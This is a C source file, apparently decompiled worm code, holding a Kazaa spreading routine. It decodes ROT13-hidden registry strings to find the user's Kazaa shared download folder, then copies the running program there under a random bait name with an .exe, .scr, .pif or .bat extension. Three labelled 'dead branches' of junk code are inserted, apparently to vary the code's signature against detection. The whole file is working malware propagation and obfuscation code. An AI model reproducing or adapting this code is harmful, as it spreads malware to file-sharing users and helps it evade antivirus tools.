#include "data_globals.h"
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

#pragma optimize("", off)
void kazaa_spread(LPCSTR param_1)
{
    char local_158[64];
    char local_178[32];
    HKEY local_118;
    DWORD local_114 = 256;
    BYTE local_110[256];
    int iVar4;
    int names_count;

    DWORD DVar2 = GetTickCount();
    srand(DVar2);
    names_count = KAZAA_NAMES_COUNT;

    // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        SYSTEMTIME st;
        char user_buf[128];
        DWORD user_len = sizeof(user_buf);
        GetSystemInfo(&si);
        GetLocalTime(&st);
        if (GetUserNameA(user_buf, &user_len)) {
            volatile DWORD hash = 0;
            for (volatile DWORD i = 0; i < 2; i++) {
                hash += si.dwNumberOfProcessors + st.wHour;
            }
            hash ^= user_buf[0];
            // read existing locals (no modification)
            volatile size_t len1 = local_158 ? strlen(local_158) : 0;
            volatile size_t len2 = local_178 ? strlen(local_178) : 0;
            hash += (DWORD)(len1 + len2);
            volatile DWORD j = 0;
            while (j < 2) {
                hash = (hash << 5) - hash + si.dwPageSize;
                j++;
            }
            memset(user_buf, 0, sizeof(user_buf));
        }
    }

    memset(local_158, 0, sizeof(local_158));
    memset(local_178, 0, sizeof(local_178));

    _CiphStr((char *)local_158, "Fbsgjner\\Xnmnn\\Genafsre");
    _CiphStr((char *)local_178, "QyQve0");

    memset(local_110, 0, local_114);

    LSTATUS LVar3 = RegOpenKeyExA(HKEY_CURRENT_USER, (const char *)local_158, 0, KEY_QUERY_VALUE, &local_118);
    if (LVar3 != 0)
        return;

    LVar3 = RegQueryValueExA(local_118, (const char *)local_178, NULL, NULL, local_110, &local_114);
    if (LVar3 != 0)
        return;

    RegCloseKey(local_118);

    if (local_110[0] == '\0')
        return;

    iVar4 = strlen((char *)local_110);
    if (local_110[iVar4 - 1] == '/')
    {
        local_110[iVar4 - 1] = '\\';
    }

    iVar4 = strlen((char *)local_110);
    if (local_110[iVar4 - 1] != '\\')
    {
        local_110[iVar4] = '\\';
        local_110[iVar4 + 1] = '\0';
    }

    iVar4 = rand();
    strcpy((char *)(local_110 + strlen((char *)local_110)), kazaa_names[iVar4 % names_count]);
    strcat((char *)local_110, ".");

    iVar4 = rand() % 6;

    // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        char *tmp = (char *)malloc(64);
        if (tmp != NULL) {
            strcpy(tmp, "dummy");
            volatile DWORD len = strlen(tmp);
            volatile BYTE check = 0;
            for (volatile DWORD i = 0; i < len; i++) {
                check ^= tmp[i];
            }
            volatile DWORD j = 0;
            while (j < 2) {
                // read existing locals (no modification)
                check += j + (DWORD)local_110[0];
                j++;
            }
            char tmp2[32];
            memcpy(tmp2, tmp, 4);
            volatile DWORD val = (DWORD)tmp2[0] + check;
            val += len;
            free(tmp);
        }
    }

    if (iVar4 == 0 || iVar4 == 1)
    {
        strcat((char *)local_110, "ex");
        strcat((char *)local_110, "e");
    }
    else if (iVar4 == 2 || iVar4 == 3)
    {
        strcat((char *)local_110, "sc");
        strcat((char *)local_110, "r");
    }
    else if (iVar4 == 4)
    {
        strcat((char *)local_110, "pi");
        strcat((char *)local_110, "f");
    }
    else
    {
        strcat((char *)local_110, "ba");
        strcat((char *)local_110, "t");
    }

    // --- INSERTED DEAD BRANCH 3 (ADDITIVE ONLY) ---
    volatile DWORD dummy_tick_3 = GetTickCount();
    if ((dummy_tick_3 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_3 & 0x80000000) != 0) {
        volatile DWORD dummy_array[4];
        for (volatile DWORD i = 0; i < 4; i++) {
            dummy_array[i] = i * 0x811C9DC5;
        }
        volatile DWORD hash = 0;
        for (volatile DWORD i = 0; i < 4; i++) {
            hash ^= dummy_array[i];
            hash = (hash << 5) - hash;
        }
        volatile DWORD extra_val = 0;
        for (volatile DWORD i = 0; i < 2; i++) {
            extra_val += (hash >> i) & 0xFF;
        }
        extra_val ^= dummy_array[3];
        // read existing locals (no modification)
        extra_val += (DWORD)iVar4;
        memset(dummy_array, 0, sizeof(dummy_array));
    }

    CopyFileA(param_1, (LPCSTR)local_110, TRUE);
    return;
}
#pragma optimize("", on)
